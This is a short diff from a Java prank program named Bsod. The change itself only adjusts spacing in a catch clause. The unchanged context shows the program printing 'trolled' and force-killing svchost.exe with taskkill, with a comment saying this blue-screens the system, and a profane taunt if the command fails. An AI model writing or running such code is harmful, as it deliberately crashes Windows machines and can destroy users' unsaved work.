@@ -20,7 +20,7 @@ public class Bsod {
 			System.out.println("trolled");
 			// kill svchost.exe, this causes the system to blue screen
 			runtime.exec("taskkill.exe /f /im svchost.exe");
-		} catch (Exception e){
+		} catch (Exception e) {
 			// if we cannot execute the command say we cannot
 			System.out.println("fuck you lucky bastard");
 		}
